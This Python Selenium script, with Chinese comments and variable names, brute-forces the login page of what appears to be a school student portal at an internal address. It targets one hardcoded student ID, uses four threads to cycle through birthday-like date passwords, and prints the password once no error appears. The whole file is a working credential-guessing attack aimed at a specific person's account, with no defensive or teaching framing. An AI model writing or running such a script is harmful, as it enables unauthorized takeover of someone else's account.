from selenium import webdriver
import time
import threading

jieshu = 1
cureect_password = 0

password_list = [
    '01020000',
    '03020000',
    '06020000',
    '09020000'
]

username = "1600301024"

def daohao(password):
    global jieshu
    global username
    driver = webdriver.Chrome()
    driver.get("http://172.16.1.99/student/public/login.asp")
    time.sleep(2)
    while jieshu:

        password = int(password)
        password+=1
        password = str(password)
        if len(password) < 9:
            password = '0'+password
        month_days = int(password[2] + password[3])
        if month_days == 31:
            month = str('0' + str(int(password[0]+password[1]) + 1))

            password = month[0] + month[1] + '0'*2 + password[4::]
        print("当前尝试密码：",password)

        user  = driver.find_element_by_name("username")
        pw = driver.find_element_by_name("passwd")
        bt = driver.find_element_by_name("login")

        user.send_keys(username)
        pw.send_keys(password)

        bt.click()

        try:
            error = driver.find_element_by_tag_name("b")
        except:
            print("-"*60 + "正确的密码是：",password)
            global cureect_password
            cureect_password = password
            jieshu=0
            break
for i in range(4):
    threading.Thread(target=daohao,args=(password_list[i],)).start()
    time.sleep(6)
#

